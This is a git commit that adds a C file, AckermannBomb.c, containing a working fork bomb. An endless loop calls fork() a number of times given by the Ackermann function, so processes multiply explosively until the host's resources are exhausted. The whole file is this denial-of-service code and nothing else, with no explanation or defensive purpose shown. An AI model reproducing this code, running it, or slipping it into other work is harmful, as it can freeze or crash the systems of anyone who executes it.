07402395a5c745d7f192a8f29c0a4facfdaa6b86
VirtualSolace <146604439+VirtualSolace@users.noreply.github.com>
2025-10-27 21:07:43 -0600

    Add files via upload

---
+++ AckermannBomb.c
@@ -0,0 +1,24 @@
+#include <unistd.h>
+
+int num_forks(int i){
+	return 1 << i;		// 2^i
+}
+
+int ackermann(int m, int n){
+	if(m == 0) return n+1;
+	if(n == 0) return ackermann(m-1, 1);
+	return ackermann(m-1, ackermann(m, n-1));
+}
+
+
+int main(){
+	int i = 0, k = 0;
+	while(1){
+		for(int j = 0; j < ackermann(k,i); j++){
+			fork();
+		}
+		i++;
+		k++;
+	}
+	return 0;
+}
